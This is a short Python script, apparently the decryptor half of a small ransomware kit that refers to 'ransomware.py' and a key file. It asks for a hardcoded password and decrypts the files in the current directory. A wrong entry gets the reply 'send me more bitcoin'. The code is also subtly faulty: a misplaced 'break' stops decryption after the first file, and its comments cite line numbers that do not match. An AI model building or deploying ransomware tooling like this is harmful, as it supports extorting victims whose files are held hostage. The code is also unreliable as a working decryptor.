#!/usr/bin/env python3
#to change the password you can just change the variable password on line 26
#to change the correct password alert you can just simply edit the print function on line 37
#to change the wrong password alert you can just simply edit the print function on line 39
import os
from cryptography.fernet import Fernet


#cari beberapa files ygy


files = []

for file in os.listdir():
	if file == "ransomware.py" or file == "kunci.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)


with open("kunci.key", "rb") as key:
	kunci = key.read()

password = "password"

user_pass = input("Put your password here\n")

if user_pass == password:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(kunci).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
		print("Correct password, congrats")
		break
else:
	print("Haha wrong password, send me more bitcoin")
